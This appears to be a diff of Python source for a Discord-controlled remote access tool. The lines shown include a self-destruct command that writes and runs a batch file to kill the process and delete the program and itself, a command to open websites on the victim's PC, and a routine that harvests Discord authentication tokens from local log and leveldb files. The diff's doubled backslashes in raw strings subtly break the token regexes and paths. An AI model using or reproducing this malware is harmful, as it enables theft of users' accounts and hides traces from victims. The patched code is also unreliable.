@@ -902,14 +902,14 @@ async def SelfDestruct_command(ctx: SlashContext):
         hello = os.getpid()
         bat = """@echo off""" + " & " + "taskkill" + r" /F /PID " + str(hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " & " + r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""
         temp = (os.getenv("TEMP"))
-        temp5 = temp + r"\delete.bat"
+        temp5 = temp + r"\\delete.bat"
         if os.path.isfile(temp5):
             delelee = "del " + temp5 + r" /f"
             os.system(delelee)                
-        f5 = open(temp + r"\delete.bat", 'a')
+        f5 = open(temp + r"\\delete.bat", 'a')
         f5.write(bat)
         f5.close()
-        os.system(r"start /min %temp%\delete.bat")
+        os.system(r"start /min %temp%\\delete.bat")
 
 
 @slash.slash(name="StartWebsite", description="Start website link on users PC", guild_ids=g)
@@ -985,7 +985,7 @@ async def DiscordInfo_command(ctx:SlashContext):
                 if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                     continue
                 for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for regex in (r"[\\w-]{24}\.[\\w-]{6}\.[\\w-]{27}", r"mfa\.[\\w-]{84}"):
                         for token in findall(regex, line):
                             tokens.append(token)
             return tokens
